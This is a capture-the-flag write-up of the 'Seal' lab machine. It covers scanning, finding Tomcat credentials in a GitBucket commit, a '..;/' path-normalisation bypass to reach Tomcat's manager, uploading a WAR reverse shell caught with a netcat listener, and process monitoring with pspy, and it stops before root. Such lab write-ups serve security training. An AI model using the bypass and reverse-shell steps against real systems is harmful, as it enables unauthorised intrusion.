
# Seal

- Walkthrough
- Mitigrations
- References


## Walkthrough

```
└──╼ $nmap -p 22,443,8080 -A  10.10.10.250
Starting Nmap 7.93 ( https://nmap.org ) at 2023-11-15 11:20 EST
Nmap scan report for 10.10.10.250
Host is up (0.022s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4b894739673d07315e3f4c27411ff967 (RSA)
|   256 04a74f399565c5b08dd5492ed8440036 (ECDSA)
|_  256 b45e8393c54249de7125927123b18554 (ED25519)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-title: Seal Market
| tls-nextprotoneg: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Not valid before: 2021-05-05T10:24:03
|_Not valid after:  2022-05-05T10:24:03
8080/tcp open  http-proxy
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 15 Nov 2023 16:21:02 GMT
|     Set-Cookie: JSESSIONID=node014o7v5l5g0rsgxsl7sq22bzqn2.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   GetRequest: 
|     HTTP/1.1 401 Unauthorized
|     Date: Wed, 15 Nov 2023 16:21:01 GMT
|     Set-Cookie: JSESSIONID=node01pem304tamok91y11bwkngfldv0.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Wed, 15 Nov 2023 16:21:02 GMT
|     Set-Cookie: JSESSIONID=node0ud0j695jx1901i1najvrjn7si1.node0; Path=/; HttpOnly
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Content-Type: text/html;charset=utf-8
|     Allow: GET,HEAD,POST,OPTIONS
|     Content-Length: 0
|   RPCCheck: 
|     HTTP/1.1 400 Illegal character OTEXT=0x80
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 71
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character OTEXT=0x80</pre>
|   RTSPRequest: 
|     HTTP/1.1 505 Unknown Version
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 58
|     Connection: close
|     <h1>Bad Message 505</h1><pre>reason: Unknown Version</pre>
|   Socks4: 
|     HTTP/1.1 400 Illegal character CNTL=0x4
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|     <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x4</pre>
|   Socks5: 
|     HTTP/1.1 400 Illegal character CNTL=0x5
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 69
|     Connection: close
|_    <h1>Bad Message 400</h1><pre>reason: Illegal character CNTL=0x5</pre>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

<snip>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.66 seconds
```

Port 8080 was hosting a Gitbucket instance. The Gitbucket instance is configured to allow registration. The Tester created an account which allowed them to view the repositories. 


![web_error](https://private-user-images.githubusercontent.com/63368388/285897564-c1728f79-769f-4086-9637-5dd27cbfa6f4.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDEwOTQwOTAsIm5iZiI6MTcwMTA5Mzc5MCwicGF0aCI6Ii82MzM2ODM4OC8yODU4OTc1NjQtYzE3MjhmNzktNzY5Zi00MDg2LTk2MzctNWRkMjdjYmZhNmY0LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzExMjclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMTI3VDE0MDMxMFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTU1ZTA3ZTVlYTgxNDU0ZWU5NjAxMTlmNjdlYTFkMjQ0OWJmZmM1ZmMxMjJlNWJmMzY0NDQzMGUwMzAyMDAyNmEmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.Y-jp4piU_j45nC9xjvgutWNHJGQQOA-44QpmcSdG2lI)

The tester searched the repositories and found Tomcat credentials in the 971f3aa3f0a0cc8aac12fd696d9631ca540f44c7 commit on the 5 May 2021. 
The tester tested for different directories on port 443 using ffuf and found the Tomcat manager directory.

```
┌─[rang3r@parrot]─[~/Projects/machines/seal]
└──╼ $ffuf -w  '/home/rang3r/Documents/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt'    -k      -u  "https://seal.htb:443/FUZZ" -ic  

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://seal.htb:443/FUZZ
 :: Wordlist         : FUZZ: /home/rang3r/Documents/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 23ms]
                        [Status: 200, Size: 19737, Words: 7425, Lines: 519, Duration: 27ms]
admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 28ms]
icon                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 21ms]
css                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
js                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 24ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 30ms]
                        [Status: 200, Size: 19737, Words: 7425, Lines: 519, Duration: 79ms]
:: Progress: [81630/81630] :: Job [1/1] :: 480 req/sec :: Duration: [0:02:13] :: Errors: 0 ::
```

The Tomcat service has the "WAR file to deploy" feature to deploy a .war file, which could be used to upload a malicious payload however the directory was blocked.

The tester was able to access it by abusing tomcat path normalisation. This feature normalises URL paths, however by entering the characters "/test/..;/" the Nginx reverse proxy will not normalise the path correctly and parse "../" therefore the requested page will be served therefore by entering the URL "https://seal.htb/manager/test/..;/html" the server will actually return "https://seal.htb/manager/html" bypassing the restriction. This works to access the manager page however requires more work to upload a ".war" file. The tester had to intercept the post request with burp suite and change the post URL to the bypass the address with the double period and a semicolon.  


![web_error](https://private-user-images.githubusercontent.com/63368388/285900777-51dad20f-c45f-4952-88dd-c7318ab0069c.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTEiLCJleHAiOjE3MDEwOTQ3NTEsIm5iZiI6MTcwMTA5NDQ1MSwicGF0aCI6Ii82MzM2ODM4OC8yODU5MDA3NzctNTFkYWQyMGYtYzQ1Zi00OTUyLTg4ZGQtYzczMThhYjAwNjljLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFJV05KWUFYNENTVkVINTNBJTJGMjAyMzExMjclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjMxMTI3VDE0MTQxMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWEzODlmYjk5ODgzZDFmN2M4MmI1OGFiMzk2MzUzOGQyNGQ1OTc2MjJmODZhMDY0OGE0MTU5ODI5Zjk2NjE0NzYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.SKic49GtzK-MompbSwuBjZ_ycukZz2iEzfQjk94QOBE)

Once the malicious file was uploaded the tester navigated to https://seal.htb/revshell/ which executed the shell connecting it to the netcat listener. 

```
┌─[rang3r@parrot]─[~]
└──╼ $nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.250] 37552
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@seal:/var/lib/tomcat9$ ^Z
[1]+  Stopped                 nc -lnvp 1337
┌─[✗]─[rang3r@parrot]─[~]
└──╼ $stty raw -echo
┌─[rang3r@parrot]─[~]
nc -lnvp 1337

tomcat@seal:/var/lib/tomcat9$ export TERM=xterm
tomcat@seal:/var/lib/tomcat9$ id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
tomcat@seal:/var/lib/tomcat9$ hostname
seal
tomcat@seal:/var/lib/tomcat9$ 
```
The tester used the "pspy" tool to monitor the system processes 
```
tomcat@seal:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

<snip>

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/11/27 14:27:21 CMD: UID=997   PID=245280 | ./pspy64 
2023/11/27 14:27:21 CMD: UID=0     PID=245271 | sleep 30 
2023/11/27 14:27:21 CMD: UID=0     PID=245270 | /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:21 CMD: UID=0     PID=245269 | /usr/sbin/CRON -f 

<snip>

2023/11/27 14:27:31 CMD: UID=1000  PID=245293 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:31 CMD: UID=1000  PID=245295 | 
2023/11/27 14:27:32 CMD: UID=1000  PID=245296 | 
2023/11/27 14:27:32 CMD: UID=1000  PID=245300 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:32 CMD: UID=1000  PID=245301 | 
2023/11/27 14:27:32 CMD: UID=1000  PID=245302 | /bin/sh -c /bin/sh -c 'echo ~luis && sleep 0' 
2023/11/27 14:27:32 CMD: UID=1000  PID=245304 | python3 /usr/bin/ansible-playbook /opt/backups/playbook/run.yml 
2023/11/27 14:27:32 CMD: UID=1000  PID=245305 | 

<snip>

```

## Mitigations 

https://www.acunetix.com/vulnerabilities/web/tomcat-path-traversal-via-reverse-proxy-mapping/
## References
